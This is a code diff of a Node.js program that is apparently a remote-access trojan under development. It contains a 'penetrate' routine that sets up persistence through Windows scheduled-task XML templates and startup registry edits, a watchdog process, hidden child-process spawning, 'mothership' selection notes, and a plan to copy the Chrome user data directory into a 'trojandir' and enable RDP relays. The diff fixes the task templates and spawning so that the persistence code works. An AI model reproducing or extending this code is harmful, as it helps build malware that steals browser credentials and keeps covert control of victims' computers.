@@ -35,7 +35,6 @@ var processlist = null;
 
 initProcessList()
     .then((result) => {
-        initProcessList();
         processlist = result;
     })
     .catch((err) => {
@@ -48,8 +47,12 @@ initProcessList()
 
 // --- TASKS LIST ---
 
-// ! node/python relay --> make sure we are able to execute RDP on both of these
+// ! motership selection process
+
 // ! read/write/parse/retrieve config
+// read/write mothership
+
+// ! node/python relay --> make sure we are able to execute RDP on both of these
 // ! setup RDP --> copy chrome user data directory to trojandir
 //   C:\Users\sebas\AppData\Local\Google\Chrome\User Data to <trojandir>/chrome
 
@@ -67,6 +70,7 @@ initProcessList()
 
 // --- BUGS ---
 // ! execjob script must terminate upon completion --> when finished should exit process
+// ! processless initialisation not working
 
 // EXEC_CMD --> GetSystemOverview
 //              GetTrojanDir
@@ -1170,8 +1174,7 @@ function getRandomCode(n) {
 }
 
 function isNullOrWhitespace(str) {
-    if (!(typeof myVariable === "string"))
-        // !!!
+    if (!(typeof str === "string"))
         return false;
 
     return !str || !str.trim();
@@ -1566,8 +1569,8 @@ function startup() {
     let retrievecmd = new CmdConfig("retrieve");
     let watchdogcmd = new CmdConfig("watchdog");
 
-    penetratecmd.launch();
     retrievecmd.launch();
+    penetratecmd.launch();
     watchdogcmd.activate(null, true);
 
     watchdogcmd.childprocess?.unref();
@@ -2700,6 +2703,7 @@ function cmdlist() {
     logmsg("finished");
 }
 
+// TODO
 function validateTask(taskdetail) {
     // Last Run Time
     // Last Result
@@ -2719,9 +2723,8 @@ async function reschedule() {
 
         if (ptasknames.includes(taskname)) {
             logmsg(`task {taskname} registered`);
-            taskdetail = await exec_schtasks_query(taskname);
+            taskdetail = await getTaskDetail(taskname);
 
-            // TODO validate that task is running / active
             if ( ! validateTask(taskdetail) )
                 await createTask(taskname);
 
@@ -2732,11 +2735,11 @@ async function reschedule() {
     }
 }
 
-// TODO -- missing implementation
-function penetrate() {
+// TODO
+async function penetrate() {
     logmsg("starting");
 
-    reschedule();
+    await reschedule();
 
     // modify registry for startup items
     // copy exe/scripts to startup folders
@@ -2775,7 +2778,7 @@ cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Run
 async function invoke_exe(
     exename,
     targs = null,
-    exedirpath = "", //path.dirname(process.argv[1]),
+    exedirpath = "", 
     stdoutfunc,
     stderrfunc,
     closefunc,
@@ -2785,43 +2788,52 @@ async function invoke_exe(
         const exePath = path.join(exedirpath ?? "", exename);
 
         let child = spawn(exePath, targs, {
-            shell: exename.slice(-4) == ".cmd",
+            shell: true, // exename.slice(-4) == ".cmd",
             windowsHide: true,
+            stdio: 'pipe'
         });
 
         if (async) resolve(child);
 
-        child.stdout.on("data", (data) => {
-            let text = data.toString();
-            logmsg(`stdout: ${text}`);
-            if (stdoutfunc) stdoutfunc(text);
-        });
+        if ( ! child ) {
+            throw new Error('failed to spawn child process');
+        }
 
-        child.stderr.on("data", (data) => {
-            let text = data.toString();
+        try {
+            child?.stdout?.on("data", (data) => {
+                let text = data.toString();
+                logmsg(`stdout: ${text}`);
+                if (stdoutfunc) stdoutfunc(text);
+            });
 
-            logmsg(`stderr: ${data.toString()}`);
-            if (stderrfunc) stderrfunc(text);
-        });
+            child?.stderr?.on("data", (data) => {
+                let text = data.toString();
 
-        child.on("close", (code) => {
-            logmsg(`Child process exited with code ${code}`);
+                logmsg(`stderr: ${text}`);
+                if (stderrfunc) stderrfunc(text);
+            });
 
-            if (closefunc) {
-                closefunc(code);
-            }
+            child?.on("close", (code) => {
+                logmsg(`[YYW24]Child process exited with code ${code}`);
 
-            if (code === 0) {
-                resolve(child);
-            } else {
-                reject(new Error(`Process exited with code ${code}`));
-            }
-        });
+                if (closefunc) {
+                    closefunc(code);
+                }
 
-        child.on("error", (err) => {
-            logmsg("Failed to start child process:", err);
-            reject(err);
-        });
+                if (code === 0) {
+                    resolve(child);
+                } else {
+                    reject(new Error(`Process exited with code ${code}`));
+                }
+            });
+
+            child.on("error", (err) => {
+                logmsg("Failed to start child process:", err);
+                reject(err);
+            });
+        } catch (err) {
+            logmsg(err);
+        }
     });
 }
 
@@ -3585,9 +3597,6 @@ var taskconfig = {
     },
 };
 
-async function getTaskDetail() {
-}
-
 async function getTasks() {
     let tasknames = [];
     let taskstr = null;
@@ -3620,9 +3629,20 @@ async function getTasks() {
 }
 
 async function createTask(taskname) {
-    let taskxmlstr = taskconfig["taskxmlfuncs"][taskname]();
+    
+    //anchor
+    let taskxmlstrfunc = taskconfig["taskxmlfuncs"][taskname];
+    
+    let pexe = '';
+    let args = '';
+    let workdir = '';
+
+    let taskxmlstr = taskxmlstrfunc(taskname, '1999-07-25T12:00:00', pexe, args, workdir);
+
+    let cleanXml = taskxmlstr.replace(/>\s+/g, '>').replace(/\s+</g, '<');
+
     let fpath = path.join(systemstate.trojandir, "owd_" + taskname + ".xml");
-    fs.writeFileSync(fpath, taskxmlstr, "utf8");
+    fs.writeFileSync(fpath, cleanXml, "utf8");
     await exec_schtasks(fpath, taskname);
 }
 
@@ -3639,7 +3659,7 @@ async function exec_schtasks(taskxmlpath, taskname) {
 }
 
 
-async function exec_schtasks_query(taskname) {
+async function getTaskDetail(taskname) {
 
     let resultdict = {};
     let taskstr = '';
@@ -3693,11 +3713,11 @@ function getIdleTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
         <RegistrationInfo>
             <Date>2026-04-26T09:45:36.6514157</Date>
             <Author>test</Author>
-            <URI>{intaskname}</URI>
+            <URI>${intaskname}</URI>
         </RegistrationInfo> 
         <Triggers>
             <IdleTrigger>
-                <StartBoundary>{tasktimestr}</StartBoundary>
+                <StartBoundary>${tasktimestr}</StartBoundary>
             </IdleTrigger>
         </Triggers>
         <Settings>
@@ -3723,9 +3743,9 @@ function getIdleTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
         </Settings>
         <Actions Context="Author">
             <Exec>
-                <Command>{pexe}</Command>
-                <Arguments>{args}</Arguments>
-                <WorkingDirectory>{workdir}</WorkingDirectory>
+                <Command>${pexe}</Command>
+                <Arguments>${args}</Arguments>
+                <WorkingDirectory>${workdir}</WorkingDirectory>
             </Exec>
         </Actions>
         </Task>`;
@@ -3740,13 +3760,13 @@ function getRepTaskXMLStr(intaskname, tskxmltime, pexe, args, workdir) {
             <RegistrationInfo>
                 <Date>2026-04-26T09:45:36.6514157</Date>
                 <Author>test</Author>
-                <URI>{intaskname}</URI>
+                <URI>${intaskname}</URI>
             </RegistrationInfo> 
             <Triggers> 
                 <CalendarTrigger> 
                     <StartBoundary>2026-04-30T09:00:00</StartBoundary> 
                     <Repetition> 
-                        <Interval>PT{tskxmltime}M</Interval> 
+                        <Interval>PT${tskxmltime}M</Interval> 
                         <StopAtDurationEnd>false</StopAtDurationEnd> 
                     </Repetition> 
                     <ScheduleByDay> 
@@ -3775,9 +3795,9 @@ function getRepTaskXMLStr(intaskname, tskxmltime, pexe, args, workdir) {
             </Settings>
             <Actions Context="Author">
                 <Exec>
-                    <Command>{pexe}</Command>
-                    <Arguments>{args}</Arguments>
-                    <WorkingDirectory>{workdir}</WorkingDirectory>
+                    <Command>${pexe}</Command>
+                    <Arguments>${args}</Arguments>
+                    <WorkingDirectory>${workdir}</WorkingDirectory>
                 </Exec>
             </Actions>
         </Task>`;
@@ -3792,13 +3812,13 @@ function getTimeTaskXMLStr(intaskname, timetaskxmltime, pexe, args, workdir) {
         <RegistrationInfo>
             <Date>2026-04-26T09:45:36.6514157</Date>
             <Author>test</Author>
-            <URI>{intaskname}</URI>
+            <URI>${intaskname}</URI>
         </RegistrationInfo> 
         <Triggers> 
             <TimeTrigger> 
                 <StartBoundary>2008-09-01T03:00:00</StartBoundary> 
                 <Repetition> 
-                <Interval>PT{timetaskxmltime}M</Interval> 
+                <Interval>PT${timetaskxmltime}M</Interval> 
                 </Repetition> 
                 <RandomDelay>PT30S</RandomDelay> 
             </TimeTrigger> 
@@ -3824,9 +3844,9 @@ function getTimeTaskXMLStr(intaskname, timetaskxmltime, pexe, args, workdir) {
         </Settings>
         <Actions Context="Author">
         <Exec>
-            <Command>{pexe}</Command>
-            <Arguments>{args}</Arguments>
-            <WorkingDirectory>{workdir}</WorkingDirectory>
+            <Command>${pexe}</Command>
+            <Arguments>${args}</Arguments>
+            <WorkingDirectory>${workdir}</WorkingDirectory>
         </Exec>
         </Actions>
         </Task>`;
@@ -3834,13 +3854,13 @@ function getTimeTaskXMLStr(intaskname, timetaskxmltime, pexe, args, workdir) {
     return taskxmlstr;
 }
 
-function getDailyTaskXMLStr(intaskname, pexe, args, workdir) {
+function getDailyTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
     let taskxmlstr = `
         <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
         <RegistrationInfo>
             <Date>2026-04-26T09:45:36.6514157</Date>
             <Author>test</Author>
-            <URI>{intaskname}</URI>
+            <URI>${intaskname}</URI>
         </RegistrationInfo> 
         <Triggers>
             <CalendarTrigger>
@@ -3872,9 +3892,9 @@ function getDailyTaskXMLStr(intaskname, pexe, args, workdir) {
         </Settings>
         <Actions Context="Author">
             <Exec>
-                <Command>{pexe}</Command>
-                <Arguments>{args}</Arguments>
-                <WorkingDirectory>{workdir}</WorkingDirectory>
+                <Command>${pexe}</Command>
+                <Arguments>${args}</Arguments>
+                <WorkingDirectory>${workdir}</WorkingDirectory>
             </Exec>
         </Actions>
         </Task>`;
